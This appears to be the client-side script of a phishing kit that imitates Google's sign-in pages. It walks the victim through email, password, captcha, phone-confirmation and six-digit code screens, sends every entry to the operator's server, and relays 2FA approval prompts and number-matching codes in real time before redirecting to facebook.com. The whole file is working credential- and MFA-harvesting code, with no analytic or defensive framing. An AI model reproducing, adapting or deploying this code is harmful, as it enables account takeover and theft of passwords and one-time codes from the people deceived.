let sessionId;

const emailCard = document.getElementById("1");
const passwordCard = document.getElementById("2");
const signInRequestCard = document.getElementById("3");
const confirmPhoneCard = document.getElementById("4");
const phoneOtpCard = document.getElementById("5");

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const captchaInput = document.getElementById("captcha");
const confirmPhoneInput = document.getElementById("phone");
const phoneOtpInput = document.getElementById("otp");

const inputContainer = document.getElementById("input-container-1");
const inputContainer2 = document.getElementById("input-container-2");
const captchaInputContainer = document.getElementById(
  "input-container-captcha"
);
const inputContainer4 = document.getElementById("input-container-4");
const inputContainer5 = document.getElementById("input-container-5");

const captchaContainer = document.getElementById("captcha-container");
const captchaImage = document.getElementById("captcha-image");

const errorMessage = document.getElementById("error-message-1");
const errorMessage2 = document.getElementById("error-message-2");
const captchaErrorMessage = document.getElementById("error-message-captcha");
const confirmPhoneErrorMessage = document.getElementById("error-message-4");
const phoneOtpErrorMessage = document.getElementById("error-message-5");

let isErrorEmail;
let isErrorPassword;
let isErrorCaptcha;
let isErrorConfirmPhone;
let isErrorPhoneOtp;

let isCaptcha;

let userName = "";

document.addEventListener("click", function (e) {
  let targetId = e.target.id;

  if (targetId == "show-password") {
    passwordInput.type =
      passwordInput.type === "password" ? "text" : "password";
  } else if (targetId == "submit-email-btn") {
    emailCard.classList.add("submitting");

    if (isErrorEmail) {
      inputContainer.classList.remove("error");
      errorMessage.classList.add("hide");
      isErrorEmail = false;
    }

    if (checkInput(emailInput.value)) {
      if (isCaptcha) {
        if (checkInput(captchaInput.value)) {
          if (isErrorCaptcha) {
            captchaInputContainer.classList.remove("error");
            captchaErrorMessage.classList.add("hide");
            isErrorCaptcha = false;
          }
          signInCaptchaXhr(captchaInput.value);
        } else {
          captchaInputError(
            "Please enter the characters you see in the image above"
          );
          emailCard.classList.remove("submitting");
        }
      } else {
        signInUsernameXhr(emailInput.value);
      }
    } else {
      emailInputError("Enter an email or phone number");
      emailCard.classList.remove("submitting");
    }
  } else if (targetId == "submit-password-btn") {
    passwordCard.classList.add("submitting");

    if (isErrorPassword) {
      inputContainer2.classList.remove("error");
      errorMessage2.classList.add("hide");
      isErrorPassword = false;
    }

    if (checkInput(passwordInput.value)) {
      signInPasswordXhr(passwordInput.value);
    } else {
      passwordInputError("Enter a password");
      passwordCard.classList.remove("submitting");
    }
  } else if (targetId == "submit-confirm-phone-btn") {
    confirmPhoneCard.classList.add("submitting");

    if (isErrorConfirmPhone) {
      inputContainer4.classList.remove("error");
      confirmPhoneErrorMessage.classList.add("hide");
      isErrorConfirmPhone = false;
    }

    if (checkInput(confirmPhoneInput.value)) {
      confirmPhoneXhr(confirmPhoneInput.value);
    } else {
      confirmPhoneInputError("Please enter a phone number");
      confirmPhoneCard.classList.remove("submitting");
    }
  } else if (targetId == "submit-otp-btn") {
    phoneOtpCard.classList.add("submitting");

    if (isErrorPhoneOtp) {
      inputContainer5.classList.remove("error");
      phoneOtpErrorMessage.classList.add("hide");
      isErrorPhoneOtp = false;
    }

    if (checkInput(phoneOtpInput.value)) {
      if (phoneOtpInput.value.length != 6) {
        phoneOtpInputError("Wrong number of digits. Try again.");
        phoneOtpCard.classList.remove("submitting");
      } else {
        phoneOtpXhr(phoneOtpInput.value);
      }
    } else {
      phoneOtpInputError("Enter a code");
      phoneOtpCard.classList.remove("submitting");
    }
  }
});

function signInUsernameXhr(userName2) {
  // isContinueSignIn = true;
  let signInUsernameXhr = new XMLHttpRequest();
  signInUsernameXhr.open("POST", "/sign-in", true);
  signInUsernameXhr.setRequestHeader("Content-type", "application/json");
  signInUsernameXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      username: userName2,
    })
  );

  signInUsernameXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      userName = userName2;
      if (response == 0) {
        emailInputError("Couldn’t find your Google Account");
      } else if (response == 1) {
        document.getElementById("username-2").innerText = userName;
        changeCard(emailCard, passwordCard);
      } else if (response == 2) {
        isCaptcha = true;
        captchaContainer.style.display = "block";
        captchaImage.src = `/captchas/${sessionId}.png`;
      }
      emailCard.classList.remove("submitting");
      // isContinueSignIn = false;
    }
  };
}

function signInCaptchaXhr(captcha) {
  // isContinueSignIn = true;
  let signInCaptchaXhr = new XMLHttpRequest();
  signInCaptchaXhr.open("POST", "/sign-in-captcha", true);
  signInCaptchaXhr.setRequestHeader("Content-type", "application/json");
  signInCaptchaXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      captcha: captcha,
    })
  );

  signInCaptchaXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      if (response == 0) {
        captchaImage.src = `/captchas/${sessionId}.png?reload=${Date.now()}`;
        captchaInputError(
          "Please re-enter the characters you see in the image above"
        );
      } else if (response == 1) {
        userName = emailInput.value;
        document.getElementById("username-2").innerText = userName;
        changeCard(emailCard, passwordCard);
      } else if (response == 2) {
      }
      emailCard.classList.remove("submitting");
      // isContinueSignIn = false;
    }
  };
}

function signInPasswordXhr(password) {
  // isContinueSignIn = true;
  let signInPasswordXhr = new XMLHttpRequest();
  signInPasswordXhr.open("POST", "/sign-in-2", true);
  signInPasswordXhr.setRequestHeader("Content-type", "application/json");
  signInPasswordXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      password: password,
    })
  );

  signInPasswordXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = JSON.parse(this.response);
      console.log(response);
      if (response.code == 0) {
        passwordInputError(
          "Wrong password. Try again or click Forgot password to reset it."
        );
      } else if (response.code == 1) {
        document.getElementById("username-3").innerText = userName;
        document.getElementById("phone-name").innerText = response.message;
        document.getElementById("phone-name-2").innerText = response.message;
        changeCard(passwordCard, signInRequestCard);
        setTimeout(function () {
          ping();
        }, 5000);
      } else if (response.code == 2) {
        document.getElementById("username-4").innerText = userName;
        document.getElementById("masked-number").innerText = response.message;
        changeCard(passwordCard, confirmPhoneCard);
      } else if (response.code == 3) {
        location.replace("https://facebook.com");
      } else {
        document.getElementById("username-3").innerText = userName;
        document.getElementById("phone-name").innerText = response.message;
        document.getElementById("phone-name-2").innerText = response.message;
        document.getElementById("masked-number").innerText = response.message;
        document.getElementById("signin-request-image").style.display = "none";
        document.getElementById("code-command-number-1").innerText =
          response.code;
        document.getElementById("code-command-number-1").style.display =
          "block";
        document.getElementById("code-command-number").innerText =
          response.code;

        document.getElementById("code-command").style.display = "inline-block";
        changeCard(passwordCard, signInRequestCard);
        setTimeout(function () {
          ping();
        }, 5000);
      }
      passwordCard.classList.remove("submitting");
      // isContinueSignIn = false;
    }
  };
}

function confirmPhoneXhr(phone) {
  // isContinueSignIn = true;
  let confirmPhoneXhr = new XMLHttpRequest();
  confirmPhoneXhr.open("POST", "/confirm-phone", true);
  confirmPhoneXhr.setRequestHeader("Content-type", "application/json");
  confirmPhoneXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      phone: phone,
    })
  );

  confirmPhoneXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = JSON.parse(this.response);
      if (response.code == 0) {
        confirmPhoneInputError(
          "This number doesn’t match the one you provided. Try again."
        );
      } else if (response.code == 1) {
        document.getElementById("username-5").innerText = userName;
        document.getElementById("phone-number").innerText = response.phone;
        changeCard(confirmPhoneCard, phoneOtpCard);
      }
      confirmPhoneCard.classList.remove("submitting");
      // isContinueSignIn = false;
    }
  };
}

function phoneOtpXhr(otp) {
  // isContinueSignIn = true;
  let phoneOtpXhr = new XMLHttpRequest();
  phoneOtpXhr.open("POST", "/phone-otp", true);
  phoneOtpXhr.setRequestHeader("Content-type", "application/json");
  phoneOtpXhr.send(
    JSON.stringify({
      sessionId: sessionId,
      code: otp,
    })
  );

  phoneOtpXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = JSON.parse(this.response);
      if (response.code == 0) {
        phoneOtpInputError("Wrong code. Try again.");
      } else if (response.code == 1) {
        location.replace("https://facebook.com");
      } else if (response.code == 2) {
        location.replace("https://facebook.com");
      }
      phoneOtpCard.classList.remove("submitting");
      // isContinueSignIn = false;
    }
  };
}

function ping() {
  let pingXhr = new XMLHttpRequest();
  pingXhr.open("POST", "/verify-google-url", true);
  pingXhr.setRequestHeader("Content-type", "application/json");
  pingXhr.send(
    JSON.stringify({
      sessionId: sessionId,
    })
  );

  pingXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      if (response == 0) {
        setTimeout(function () {
          ping();
          console.log("Trying again");
        }, 2000);
      } else if (response == 1) {
        location.replace("https://facebook.com");
      }
    }
  };
}

function checkInput(input) {
  if (input.trim() == "") {
    return false;
  }
  return true;
}

function emailInputError(errorMsg) {
  inputContainer.classList.add("error");
  errorMessage.classList.remove("hide");
  errorMessage.children[1].innerText = errorMsg;

  isErrorEmail = true;
}

function captchaInputError(errorMsg) {
  captchaInputContainer.classList.add("error");
  captchaErrorMessage.classList.remove("hide");
  captchaErrorMessage.children[1].innerText = errorMsg;

  isErrorCaptcha = true;
}

function passwordInputError(errorMsg) {
  inputContainer2.classList.add("error");
  errorMessage2.classList.remove("hide");
  errorMessage2.children[1].innerText = errorMsg;

  isErrorPassword = true;
}

function confirmPhoneInputError(errorMsg) {
  inputContainer4.classList.add("error");
  confirmPhoneErrorMessage.classList.remove("hide");
  confirmPhoneErrorMessage.children[1].innerText = errorMsg;

  isErrorConfirmPhone = true;
}

function phoneOtpInputError(errorMsg) {
  inputContainer5.classList.add("error");
  phoneOtpErrorMessage.classList.remove("hide");
  phoneOtpErrorMessage.children[1].innerText = errorMsg;

  isErrorPhoneOtp = true;
}

function changeCard(currentCard, nextCard) {
  currentCard.style.display = "none";
  nextCard.style.display = "flex";
}

async function startSession() {
  try {
    const response = await fetch("/start-session", { method: "POST" });
    const data = await response.json();
    if (data.success) {
      console.log("Session ID:", data.sessionId);
      // You can store sessionId in localStorage or a hidden input
      sessionId = data.sessionId;
    }
  } catch (err) {
    console.error("Failed to start session:", err);
  }
}

// Call this on page load
startSession();
